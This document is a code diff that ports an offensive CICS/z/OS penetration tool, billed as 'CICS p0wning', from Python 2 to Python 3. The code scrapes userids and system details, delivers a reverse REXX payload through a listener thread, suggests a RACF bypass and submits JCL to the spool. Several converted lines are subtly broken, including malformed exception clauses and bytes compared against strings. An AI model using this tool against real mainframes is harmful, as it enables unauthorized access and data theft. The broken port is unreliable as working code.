@@ -16,7 +16,7 @@ from time import sleep
 import threading
 
 import py3270
-from py3270 import Emulator,CommandError,FieldTruncateError,TerminatedError,WaitError,KeyboardStateError,FieldTruncateError,x3270App,s3270App
+from py3270 import Emulator,CommandError,FieldTruncateError,TerminatedError,WaitError,KeyboardStateError,FieldTruncateError,X3270App,S3270App
 
 
 ####################################################################################
@@ -80,33 +80,33 @@ class EmulatorIntermediate(Emulator):
 		self.delay = delay
 
 	def send_enter(self): # Allow a delay to be configured
-		self.exec_command('Enter')
+		self.exec_command(b'Enter')
 		if self.delay > 0:
 			sleep(self.delay)
     
 	def send_clear(self): # Allow a delay to be configured
-		self.exec_command('Clear')
+		self.exec_command(b'Clear')
 		if self.delay > 0:
 			sleep(self.delay)
             
 	def send_eraseEOF(self): # Allow a delay to be configured
-		self.exec_command('EraseEOF')
+		self.exec_command(b'EraseEOF')
 		if self.delay > 0:
 			sleep(self.delay)
       
 	def send_pf11(self):
-		self.exec_command('PF(11)')
+		self.exec_command(b'PF(11)')
             
 	def screen_get(self):
-		response = self.exec_command('Ascii()')
-		if ''.join(response.data).strip() == "":
+		response = self.exec_command(b'Ascii()')
+		if b''.join(response.data).strip() == "":
 		    sleep(0.5)
 		    return self.screen_get()
 		return response.data
 
 	# Send text without triggering field protection
 	def safe_send(self, text):
-		for i in xrange(0, len(text)):
+		for i in range(0, len(text)):
 			self.send_string(text[i])
 			if self.status.field_protection == 'P':
 				return False # We triggered field protection, stop
@@ -124,19 +124,19 @@ class EmulatorIntermediate(Emulator):
 				return True # Hah, we win, take that mainframe
 			else:
 				return False # we entered what we could, bailing
-		except CommandError, e:
+		except CommandError(e):
 			# We hit an error, get mad
 			return False
 			# if str(e) == 'Keyboard locked':
 
 	# Search the screen for text when we don't know exactly where it is, checking for read errors
 	def find_response(self, response):
-		for rows in xrange(1,int(self.status.row_number)+1):
-			for cols in xrange(1, int(self.status.col_number)+1-len(response)):
+		for rows in range(1,int(self.status.row_number)+1):
+			for cols in range(1, int(self.status.col_number)+1-len(response)):
 				try:
 					if self.string_found(rows, cols, response):
 						return True
-				except CommandError, e:
+				except CommandError(e):
 					# We hit a read error, usually because the screen hasn't returned
 					# increasing the delay works
 					sleep(self.delay)
@@ -151,29 +151,29 @@ class EmulatorIntermediate(Emulator):
 		# from what I can tell - if you get a SF(c0=c*) it means a start of field.
 		# This is then what we are looking for
 		
-		for _ in xrange(0,2):
-			response = self.exec_command('ReadBuffer(Ascii)')
-			if ''.join(response.data).strip()=="":
+		for _ in range(0,2):
+			response = self.exec_command(b'ReadBuffer(Ascii)')
+			if b''.join(response.data).strip()=="":
 				sleep(0.3)
 			else:
 				break
 		else:
-			if ''.join(response.data).strip()=="":
+			if b''.join(response.data).strip()=="":
 				raise Exception("Unable to retrieve buffer data")
 		for counter, char in enumerate(response.data[row-1].split()):
-			if char.startswith("SF(c0=c"):
+			if char.startswith(b"SF(c0=c"):
 				return counter+2 # +1 to convert the 0 based index to 1 based
 								 # +1 to move to actual field
     
-    # Get the current x3270 cursor position
+    # Get the current X3270 cursor position
 	def get_pos(self):
-		results = self.exec_command('Query(Cursor)')
-		row = int(results.data[0].split(' ')[0])
-		col = int(results.data[0].split(' ')[1])
+		results = self.exec_command(b'Query(Cursor)')
+		row = int(results.data[0].split(b' ')[0])
+		col = int(results.data[0].split(b' ')[1])
 		return (row,col)
 
 	def get_hostinfo(self):
-		return self.exec_command('Query(Host)').data[0].split(' ')
+		return self.exec_command(b'Query(Host)').data[0].split(' ')
 
 class ThreadListen(threading.Thread):
     """Threaded client connection for reverse REXX"""
@@ -195,13 +195,13 @@ class ThreadListen(threading.Thread):
                 whine('Payload delivered ('+str(rc)+' bytes)','good') 
             else:
                 whine('Payload could not be delivered','err') 
-        except Exception, e:
+        except Exception(e):
             pass
 
 
 def logo():
 
-  print bcolors.BLUE + '''
+  print(bcolors.BLUE + '''
   
        ::::::::   :::::::::::   ::::::::    ::::::::   ::::::::: :::       :::::::    ::: 
       :+:    :+:      :+:      :+:    :+:  :+:    :+:  :+:    :+::+:       :+::+:+:   :+: 
@@ -211,10 +211,10 @@ def logo():
       #+#    #+#      #+#      #+#    #+#  #+#    #+#  #+#        #+#+# #+#+# #+#   #+#+# 
        ########   ###########   ########    ########   ###         ###   ###  ###    #### 
       
-                            The tool for some CICS p0wning !\t\tAuthor: @Ayoul3__\n'''+ bcolors.ENDC
+                            The tool for some CICS p0wning !\t\tAuthor: @Ayoul3__\n'''+ bcolors.ENDC)
   
 def signal_handler(signal, frame):
-        print 'Done !'
+        print('Done !')
         sys.exit(0)
 
 def printProgress (iteration, total, prefix = '', suffix = '', decimals = 1, barLength = 100):
@@ -240,7 +240,7 @@ def printProgress (iteration, total, prefix = '', suffix = '', decimals = 1, bar
         sys.stdout.flush()
           
 def rand_name(size=8, chars=string.ascii_letters):
-	return ''.join(random.choice(chars) for x in xrange(1, size))
+	return ''.join(random.choice(chars) for x in range(1, size))
   
 def format_request(request):
     i =0
@@ -252,7 +252,7 @@ def format_request(request):
 def show_screen():
     data = em.screen_get()
     for d in data:
-        print d
+        print(d)
         
 def whine(text, kind='clear', level=0):
   """
@@ -268,7 +268,7 @@ def whine(text, kind='clear', level=0):
   if level == 1: lvldisp = "\t"
   elif level == 2: lvldisp = "\t\t"
   elif level == 3: lvldisp = "\t\t\t"
-  print color+lvldisp+typdisp+text+ (bcolors.ENDC if color!="" else "")
+  print(color+lvldisp+typdisp+str(text)+ (bcolors.ENDC if color!="" else ""))
 
 def connect_zOS(target):
     """
@@ -300,13 +300,13 @@ def do_authenticate(userid, password, pos_pass):
    em.send_enter()
   
    data = em.screen_get()
-   if any("Your userid is invalid" in s for s in data):
+   if any(b"Your userid is invalid" in s for s in data):
       whine('Incorrect userid information','err')
       sys.exit()
-   elif any("Your password is invalid" in s for s in data):
+   elif any(b"Your password is invalid" in s for s in data):
       whine('Incorrect password information','err')
       sys.exit()
-   elif any("Sign on failure" in s for s in data):
+   elif any(b"Sign on failure" in s for s in data):
       whine('Invalid credentials','err')
       sys.exit();
     
@@ -320,29 +320,30 @@ def check_valid_applid(applid, do_authent, method = 1,custom_cics=False):
     em.safe_send(applid) #CICS APPLID in VTAM
     data = em.screen_get()
     em.send_enter()
+    em.send_enter()
     
     data = em.screen_get()
     
-    if any("Invalid Command" in d for d in data):
+    if any(b"Invalid Command" in d for d in data):
         whine('Invalid APPLID "'+applid+'"','err');
         sys.exit()
     
-    if any("Command is in progress" in d for d in data):
+    if any(b"Command is in progress" in d for d in data):
         whine("Waiting for VTAM command completion",'warn')
         sleep(1.3)        
     
     if do_authent:
         pos_pass=1;
-        data = em.screen_get()   
+        data = em.screen_get()  
         for d in data:
-            if "Password " in d or "Code " in d or "passe " in d:
+            if b'Password' in d or b"Code " in d or b"passe " in d:
                 break;
             else:
                pos_pass +=1
             if pos_pass > 23:
                 whine("Could not find a password field. Was looking for \"password\", \"code\" or \"pass\" strings",'err')
                 for d in data:
-                    print d
+                    print(d)
                 sys.exit();
         do_authenticate(results.userid, results.password, pos_pass)
         whine("Successful authentication",'good')
@@ -396,15 +397,15 @@ def query_cics(request, verify, line):
         
     data = em.screen_get()
 
-    if len(request) > 4 and "DFHAC2002" in data[22] and "CECI" in data[22]:
+    if len(request) > 4 and b"DFHAC2002" in data[22] and b"CECI" in data[22]:
         whine("Cannot access CECI, try --bypass switch to bypass RACF",'err')
         sys.exit()
-    if len(request) > 4 and "DFHAC2002" in data[22] and "CEMT" in data[22]:
+    if len(request) > 4 and b"DFHAC2002" in data[22] and b"CEMT" in data[22]:
         whine("Cannot access CEMT, try --bypass switch to bypass RACF",'err')
         sys.exit()
         
     for v in verify:
-        if v in data[line-1].strip():
+        if bytes(v.encode()) in data[line-1].strip():
             return True
     else:
         return False
@@ -425,10 +426,10 @@ def get_cics_value(request, identifier, double_enter=False):
     em.send_enter()
     data = em.screen_get()
     
-    if "DFHAC2002" in data[22] and "CECI" in data[22]:
+    if b"DFHAC2002" in data[22] and b"CECI" in data[22]:
         whine("Cannot access CECI, try --bypass switch to bypass RACF",'err')
         sys.exit()
-    if "DFHAC2002" in data[22] and "CEMT" in data[22]:
+    if b"DFHAC2002" in data[22] and b"CEMT" in data[22]:
         whine("Cannot access CEMT, try --bypass switch to bypass RACF",'err')
         sys.exit()
         
@@ -473,20 +474,21 @@ def query_cics_scrap(request, pattern, length, depth, scrolls):
         i +=1;
     data = em.screen_get()
         
-    if "NOT AUTHORIZED" in data[2] or "DFHAC2002" in data[22]:
+    if b"NOT AUTHORIZED" in data[2] or b"DFHAC2002" in data[22]:
         whine("Not authorized to issue "+request+", try --bypass switch to bypass RACF",'err')
         return None
     
     for d in data:
-       if pattern in d:
-           pos= d.find(pattern) + len(pattern)
+       patternEncode = bytes(pattern.encode())
+       if patternEncode in d:
+           pos= d.find(patternEncode) + len(pattern)
            if d[pos:pos+length].strip() in out:
               continue;
-           out.append(d[pos:pos+length].strip().replace(")",""))
+           out.append(d[pos:pos+length].strip().replace(b")",b""))
     
     em.send_pf3()
     if len(out) > 0:
-      return '\n'.join(out)
+      return b'\n'.join(out)
     else:
       return None;    
 
@@ -504,10 +506,10 @@ def send_cics(request, double=False):
     em.send_enter()
     data = em.screen_get()
         
-    if "DFHAC2002" in data[22] and "CECI" in data[22]:
+    if b"DFHAC2002" in data[22] and b"CECI" in data[22]:
         whine("Cannot access CECI, try --bypass switch to bypass RACF",'err')
         sys.exit()
-    elif "DFHAC2002" in data[22] and "CEMT" in data[22]:
+    elif b"DFHAC2002" in data[22] and b"CEMT" in data[22]:
         whine("Cannot access CEMT, try --bypass switch to bypass RACF",'err')
         sys.exit()
         
@@ -515,12 +517,12 @@ def send_cics(request, double=False):
        em.send_enter()
     data = em.screen_get()
     
-    if "RESPONSE: NORMAL" in data[22]:
+    if b"RESPONSE: NORMAL" in data[22]:
         return True
-    elif "RESPONSE: NOSPOOL" in data[22]:
+    elif b"RESPONSE: NOSPOOL" in data[22]:
         return False
     else:
-        whine('Error:' + data[22],'err')
+        whine('Error:' + str(data[22]),'err')
         return False
 
 def get_hql_files():
@@ -535,11 +537,11 @@ def get_hql_files():
     
     data = em.screen_get()
     for d in data:
-       if "Dsn" in d and "(DFH" not in d:
-           pos= d.find("Dsn(") + len("Dsn(")
+       if b"Dsn" in d and b"(DFH" not in d:
+           pos= d.find(b"Dsn(") + len(b"Dsn(")
            dataset =  d[pos:pos+44].strip()
            em.send_pf3()
-           return dataset[:dataset.rfind(".")]+".**"
+           return dataset[:dataset.rfind(b".")]+b".**"
     
     em.send_pf3()
     return None
@@ -556,14 +558,14 @@ def get_hql_libraries():
     
     data = em.screen_get()
     for d in data:
-       if "DFHRPL" in d:
+       if b"DFHRPL" in d:
            found_dfhrpl=True;
            continue
        if found_dfhrpl:
-           pos= d.find("(") + len("(")
+           pos= d.find(b"(") + len(b"(")
            dataset =  d[pos:pos+44].strip()
            em.send_pf3()
-           return dataset[:dataset.rfind(".")]+".**"
+           return dataset[:dataset.rfind(b".")]+b".**"
     
     em.send_pf3()
     return None
@@ -579,15 +581,15 @@ def get_users():
     em.send_enter()
     
     data = em.screen_get()
-    if "NOT AUTHORIZED" in data[2]:
+    if b"NOT AUTHORIZED" in data[2]:
         whine ("CEMT I TASK not authorized", 'err')
         return None
-    elif "DFHAC2002" in data[22]:
+    elif b"DFHAC2002" in data[22]:
         whine('Cannot access CEMT to list active users, try --bypass switch','err') 
         return None
     for d in data:
-       if "Use" in d:
-           pos= d.find("Use(") + len("Use(")
+       if b"Use" in d:
+           pos= d.find(b"Use(") + len(b"Use(")
            out.append(d[pos:pos+8].strip())
     
     em.send_pf3()
@@ -600,7 +602,7 @@ def get_version():
     """
    version = query_cics_scrap(CEMT+" I SYS", "Cicstslevel(", 8, 0, 0 )
    if version:
-     version = version.strip("0").replace("0",".")
+     version = version.strip(b"0").replace(b"0",b".")
    return version
 
 def get_os_version():
@@ -786,39 +788,39 @@ def get_infos():
     
     os_version = get_os_version()
     if os_version:
-         whine("z/OS version: "+os_version, 'good',1)
+         whine("z/OS version: "+str(os_version), 'good',1)
     
     version = get_version()
     if version :
-       whine("CICS TS Version: "+version, 'good',1)
+       whine("CICS TS Version: "+str(version), 'good',1)
     
     default_user = get_default_user()
     
     if default_user :
-       whine("CICS default user: "+default_user, 'good',1)
+       whine("CICS default user: "+str(default_user), 'good',1)
     
          
     max_tasks = get_max_tasks()
     if max_tasks:
-        whine("CICS max tasks: "+max_tasks, 'good',1)
+        whine("CICS max tasks: "+str(max_tasks), 'good',1)
         
     variables = ["USERID", "SYSID","NET","NATl"]
     values = get_cics_value(CECI+' ASSIGN', variables, True)        
     userid = values[0]; sysid = values[1]; netname = values[2]; language = values[3]
        
     
-    whine("Userid: "+userid,'good',1)
-    whine("Sysid: "+sysid,'good',1)
-    whine("LU session name: "+netname,'good',1)
-    whine("language: "+language,'good',1)
+    whine("Userid: "+str(userid),'good',1)
+    whine("Sysid: "+str(sysid),'good',1)
+    whine("LU session name: "+str(netname),'good',1)
+    whine("language: "+str(language),'good',1)
     
     hlq_files = get_hql_files()
     hlq_libraries = get_hql_libraries()
     
     if hlq_files:
-       whine("Files HLQ:\t"+hlq_files,'good',1)
+       whine("Files HLQ:\t"+str(hlq_files),'good',1)
     if hlq_libraries:
-       whine("Library path:\t"+hlq_libraries,'good',1)
+       whine("Library path:\t"+str(hlq_libraries),'good',1)
     
     whine("Active users", 'info')
     users = get_users()
@@ -836,7 +838,7 @@ def get_infos():
     
     if (tdqueue or tdqueue2 ) and (tdqueue !="*" or tdqueue2 !="*") and is_ceci:
         whine('Transiant queue to access spool is apparently available','good',1)
-        whine('When submitting a job with TDQueue, provide the option --queue='+(tdqueue.strip('\n') if tdqueue else tdqueue2.strip('\n')),'good',2)
+        whine('When submitting a job with TDQueue, provide the option --queue='+str(tdqueue.strip(b'\n') if tdqueue else tdqueue2.strip(b'\n')),'good',2)
     
     
     if is_ceci:
@@ -879,7 +881,7 @@ def get_transactions(transid):
      em.send_clear()
      em.move_to(1,2)
      
-     print "ID\tPROGRAM"
+     print("ID\tPROGRAM")
      em.safe_send(CEMT+' Inquire Trans('+transid+') en                                           ')
      em.send_enter()
      
@@ -896,7 +898,7 @@ def get_transactions(transid):
                 if (number_tran % 9) ==0 and d[1]=="+":
                     more = True
                     continue
-                print d[7:11].strip() + "\t"+d[28:36].strip()
+                print(d[7:11].strip() + "\t"+d[28:36].strip())
         
         if more:
             em.send_pf11()
@@ -913,7 +915,7 @@ def get_tsqueues(tsqueue):
      em.send_clear()
      em.move_to(1,2)
           
-     print "Tsqueue\tItems\tLength\tTransaction"
+     print("Tsqueue\tItems\tLength\tTransaction")
      
      em.safe_send(format_request(CEMT+' Inquire Tsq('+tsqueue+')'))
      em.send_enter()
@@ -940,7 +942,7 @@ def get_tsqueues(tsqueue):
             elif "Tra(" in d:
                 tsq_tran = d[10:14]
                 out += "\t"+ tsq_tran
-                print out
+                print(out)
                 
         if more:
             em.send_pf11()
@@ -957,7 +959,7 @@ def get_files(filename):
      em.send_clear()
      em.move_to(1,2)
           
-     print "FILE\tTYPE\tSTATUS\tREAD\tUPDATE\tDISP\tLOCATION"
+     print("FILE\tTYPE\tSTATUS\tREAD\tUPDATE\tDISP\tLOCATION")
      
      em.safe_send(format_request(CEMT+' Inquire File('+filename+')'))
      em.send_enter()
@@ -986,7 +988,7 @@ def get_files(filename):
             elif "Dsn(" in d:
                 file_dsn = d[15:60]
                 out += "\t"+ file_dsn
-                print out
+                print(out)
                 
         if more:
             em.send_pf11()
@@ -1145,10 +1147,10 @@ def handle_tsq_content(tsqueue, kind="read"):
     if kind=="read":
         if (results.item):
             whine("Fetching item "+results.item+" from TSqueue "+tsq_name,"info")
-            print results.item +"\t"+ fetch_tsq_item(tsq_name, results.item)
+            print(results.item +"\t"+ fetch_tsq_item(tsq_name, results.item))
         else:
             while current_item <= items:
-               print str(current_item) + "\t" +fetch_tsq_item(tsq_name, current_item)
+               print(str(current_item) + "\t" +fetch_tsq_item(tsq_name, current_item))
                current_item +=1
     
     elif kind=="add" and results.item:
@@ -1213,7 +1215,7 @@ def fetch_content(filename, ridfld, keylength):
     if out[0]==" ":
         keylength +=1
     
-    print "'"+out[0:keylength]+"':\t"+out[keylength:]
+    print("'"+out[0:keylength]+"':\t"+out[keylength:])
     
     return out[0:keylength]
     
@@ -1905,7 +1907,7 @@ def spool_write(token, jcl):
                 
         data = em.screen_get()
         if "RESPONSE: NORMAL" not in data[22]:
-            print ''
+            print('')
             whine('Received error while writing JCL ('+str(i)+'):','err')
             whine(data[22],'err')
             return False
@@ -2217,25 +2219,25 @@ def fetch_userids():
     
     default_u = tcl_u = query_cics_scrap(CEMT+" I SYS", "Dfltuser(", 8, 0, 0)
     region_id= None;
-    print default_u+" (Default user)" if default_u else '';
+    print(default_u+" (Default user)" if default_u else '')
     
     tcl_u = query_cics_scrap(CEMT+" I TCL", "Installu(", 8, 0, 0)
     if not tcl_u:
       tcp_u = query_cics_scrap(CEMT+" I TCPIPSERV", "Installusrid(", 8, 1, 1)
-      print tcp_u if tcp_u else '';
+      print(tcp_u if tcp_u else '')
     else:
-      print tcl_u
+      print(tcl_u)
       
     con_u = query_cics_scrap(CEMT+" I CONN", "Changeusrid(", 8, 1, 1)
-    print con_u if con_u else '';
+    print(con_u if con_u else '')
     uri_u = query_cics_scrap(CEMT+" I URIMAP", "Userid(", 8, 1, 1)
-    print uri_u  if uri_u else '';
+    print(uri_u  if uri_u else '')
     
     db2_u = query_cics_scrap(CEMT+" I DB2C", "Signid(", 8, 1, 1)
-    print db2_u if db2_u else '';
+    print(db2_u if db2_u else '')
     
     pro_u = query_cics_scrap(CEMT+" I PROFILE", "Installu(", 8, 0, 0)
-    print pro_u if pro_u else '';
+    print(pro_u if pro_u else '')
     
     uow_u = query_cics_scrap(CEMT+" I UOW ", "Use(", 8, 0, 0)
     if uow_u:
@@ -2243,7 +2245,7 @@ def fetch_userids():
            if default_u and default_u != uu:
               uu += " (Probbaly region ID)"
               region_id = uu
-           print uu
+           print(uu)
     return region_id
 
 def check_surrogat(surrogat_user):
@@ -2296,9 +2298,9 @@ def check_resources(kind, trans):
         variables = ["READ", 'UPDATE']
         results = get_cics_value(CECI+' QUERY SECURITY REST('+kind+') RESID('+t.strip()+')', variables, True)
         if results[0] in cvda.keys() and results[1] in cvda.keys():
-            print t.strip()+'\t'+cvda[results[0]]+'\t'+cvda[results[1]]
+            print(t.strip()+'\t'+cvda[results[0]]+'\t'+cvda[results[1]])
         else:
-            print t.strip()+'\t'+'error'+'\t'+'error'
+            print(t.strip()+'\t'+'error'+'\t'+'error')
 
 def copy_tran(old_tran, new_tran):
     whine("Getting current group of "+old_tran,'info')
@@ -2338,7 +2340,7 @@ def main(results):
        logon_screen=False
        
        for d in data:
-         if "Password" in d or "Code" in d:
+         if b"Password" in d or b"Code" in d:
            logon_screen=True
            break
          else:
@@ -2461,13 +2463,13 @@ def main(results):
     
     elif results.all_options:
         get_infos()
-        print ""
+        print("")
         whine("Getting all files", 'info')
         get_files("*")
-        print ""
+        print("")
         whine("Getting all tsqueues", 'info')
         get_tsqueues("*")
-        print ""
+        print("")
         whine("Scraping userids from different menus", 'info')
         em.send_pf3();
         region_id = fetch_userids()
@@ -2486,15 +2488,15 @@ if __name__ == "__main__" :
         # Set the emulator intelligently based on your platform
     if platform.system() == 'Darwin':
       class WrappedEmulator(EmulatorIntermediate):
-        x3270App.executable = 'x3270'
-        s3270App.executable = 's3270'
+        X3270App.executable = 'X3270'
+        S3270App.executable = 'S3270'
     elif platform.system() == 'Linux':
       class WrappedEmulator(EmulatorIntermediate):
-        x3270App.executable = 'x3270'
-        s3270App.executable = 's3270'
+        X3270App.executable = 'x3270'
+        S3270App.executable = 's3270'
     elif platform.system() == 'Windows':
       class WrappedEmulator(EmulatorIntermediate):
-        x3270App.executable = 'wc3270.exe'
+        X3270App.executable = 'wc3270.exe'
     else:
       whine('Your Platform:' + platform.system() + 'is not supported at this time.',kind='err')
       sys.exit(1)    
